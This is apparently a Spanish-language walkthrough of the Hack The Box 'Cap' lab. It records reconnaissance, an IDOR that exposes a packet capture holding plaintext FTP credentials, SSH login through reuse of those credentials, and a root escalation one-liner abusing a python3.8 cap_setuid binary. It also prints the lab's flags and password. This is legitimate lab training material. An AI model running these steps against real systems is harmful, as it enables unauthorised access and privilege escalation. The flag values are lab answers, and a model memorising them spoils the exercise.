@@ -1,0 +1,205 @@
+# Cap - HTB Starting Point
+
+## Reconocimiento
+
+### Ping
+
+```bash
+ping 10.129.50.70
+```
+
+```
+64 bytes from 10.129.50.70: icmp_seq=1 ttl=63 time=45.6 ms
+```
+
+TTL de 63 → se trata de una máquina **Linux**.
+
+### Escaneo Nmap
+
+```bash
+nmap -p- --open --min-rate 5000 -A -sS -Pn -n -vvv 10.129.50.70
+```
+
+Se identifican 3 puertos abiertos:
+
+|Puerto|Servicio|
+|---|---|
+|21/tcp|FTP|
+|22/tcp|SSH|
+|80/tcp|HTTP|
+
+---
+
+## Task 1 - How many TCP ports are open?
+
+**Respuesta: `3`**
+
+---
+
+## Enumeración Web
+
+Al acceder a `http://10.129.50.70` se encuentra un dashboard de seguridad con el usuario **Nathan**. El menú lateral presenta las secciones: Dashboard, Security Snapshot, IP Config y Network Status.
+
+![[Pasted image 20260506194228.png]]
+
+Se lanza enumeración de directorios en paralelo:
+
+```bash
+gobuster dir -u http://10.129.50.70/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+---
+
+## Task 2 - What is the `[something]` in the redirected path?
+
+Al pulsar **Security Snapshot** el navegador redirige a:
+
+```
+http://10.129.50.70/data/1
+```
+
+**Respuesta: `data`**
+
+---
+
+## Task 3 - Are you able to get to other users' scans?
+
+**Respuesta: `Yes`**
+
+Al navegar a Security Snapshot la URL tiene la forma `http://10.129.50.70/data/1`. Modificando manualmente el parámetro numérico a `0` (`http://10.129.50.70/data/0`) se accede a capturas de tráfico pertenecientes a otros usuarios, confirmando una vulnerabilidad de tipo **IDOR (Insecure Direct Object Reference)**. Aunque el nombre de usuario no cambie, sí se observan cambios en el contenido de la página. Este fallo se produce cuando la aplicación usa referencias directas a objetos internos (en este caso un índice numérico) sin validar si el usuario autenticado tiene permisos para acceder a ese recurso.
+
+---
+
+## Task 4 - What is the ID of the PCAP file that contains sensitive data?
+
+**Respuesta: `0`**
+
+El archivo `/data/0` es el que contiene datos sensibles. Es la captura con índice 0, la más antigua, generada antes de que el usuario actual iniciara sesión. Se realizan pruebas manuales para confirmar el contenido:
+
+```bash
+curl -s http://10.129.50.70/data/0
+curl -s http://10.129.50.70/data/1
+curl -s http://10.129.50.70/data/2
+```
+
+Se descarga el pcap para analizarlo: (le damos al boton de download o lanzamos el wget)
+
+```bash
+wget http://10.129.50.70/download/0 -O 0.pcap
+wireshark 0.pcap
+```
+
+![[Pasted image 20260506200218.png]]
+
+Se confirma tráfico FTP en la captura. Para localizar las credenciales se filtra en Wireshark mediante `Edit → Find Packet → String → "USER"` y `"PASS"`:
+
+![[Pasted image 20260506200342.png]] ![[Pasted image 20260506200414.png]] ![[Pasted image 20260506200444.png]]
+
+
+| Campo          | Valor             |
+| -------------- | ----------------- |
+| **Usuario**    | `nathan`          |
+| **Contraseña** | `Buck3tH4TF0RM3!` |
+
+
+---
+
+## Task 5 - Which application layer protocol contains the sensitive data?
+
+**Respuesta: `FTP`**
+
+FTP transmite las credenciales en texto claro, sin cifrado, lo que permite extraerlas directamente del tráfico capturado.
+
+---
+
+## Task 6 - On what other service does this password work?
+
+**Respuesta: `SSH`**
+
+Se comprueba reutilización de credenciales conectando por SSH:
+
+```bash
+ssh nathan@10.129.50.70
+```
+
+```
+nathan@cap:~$ whoami
+nathan
+```
+
+Acceso confirmado como `nathan`.
+
+---
+
+## User Flag
+
+```bash
+cat ~/user.txt
+```
+
+**`d4399f7a0f5f7abf08280ea0a372b374`**
+
+---
+
+## Escalada de Privilegios
+
+### Task 8 - What is the full path to the binary with special capabilities?
+
+**Respuesta: `/usr/bin/python3.8`**
+
+Se buscan binarios con Linux Capabilities en todo el sistema:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+![[Pasted image 20260506201008.png]]
+
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+```
+
+El binario relevante es `python3.8` ya que posee `cap_setuid`, que permite **cambiar el UID del proceso a 0 (root)**. Los demás binarios solo tienen `cap_net_raw` (operaciones de red), que no sirve para escalar privilegios.
+
+### Explotación
+
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+Para obtener una TTY completamente funcional con historial y flechas:
+
+```bash
+python3.8 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+---
+
+## Root Flag
+
+```bash
+cat /root/root.txt
+```
+
+**`9ba301317fa1590ce20d3356a22aab4d`**
+
+---
+
+## Resumen del ataque
+
+```
+Enumeración web → Security Snapshot
+        ↓
+IDOR /data/0 → descarga pcap
+        ↓
+Wireshark → credenciales FTP en texto claro
+        ↓
+Reutilización de credenciales → SSH como nathan
+        ↓
+getcap → python3.8 cap_setuid
+        ↓
+os.setuid(0) → root flag
+```
